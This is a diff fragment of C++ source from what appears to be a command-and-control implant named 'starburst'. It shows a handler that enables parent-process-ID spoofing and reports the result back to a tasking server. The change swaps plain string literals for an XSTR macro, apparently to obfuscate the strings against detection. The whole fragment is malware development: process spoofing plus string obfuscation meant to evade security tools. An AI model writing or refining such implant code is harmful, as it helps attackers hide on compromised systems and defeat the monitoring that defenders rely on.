@@ -20,7 +20,7 @@ auto declfn starburst::cmd_ppid_spoof(
     if ( ppid == 0 ) {
         inst.ppid_spoof = 0;
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "PPID spoof disabled" ) ) );
+            XSTR( "PPID spoof disabled" ) );
         return;
     }
 
@@ -31,7 +31,7 @@ auto declfn starburst::cmd_ppid_spoof(
         char msg[64] = { 0 };
         char num[12];
 
-        str_copy( msg, symbol<char*>( const_cast<char*>( "Cannot access PID " ) ) );
+        str_copy( msg, XSTR( "Cannot access PID " ) );
         uint32_t off = str_len( msg );
         int_to_str( num, ppid, 10 );
         uint32_t nlen = str_len( num );
@@ -48,7 +48,7 @@ auto declfn starburst::cmd_ppid_spoof(
     char msg[64] = { 0 };
     char num[12];
 
-    str_copy( msg, symbol<char*>( const_cast<char*>( "PPID spoof set to " ) ) );
+    str_copy( msg, XSTR( "PPID spoof set to " ) );
     uint32_t off = str_len( msg );
     int_to_str( num, ppid, 10 );
     uint32_t nlen = str_len( num );
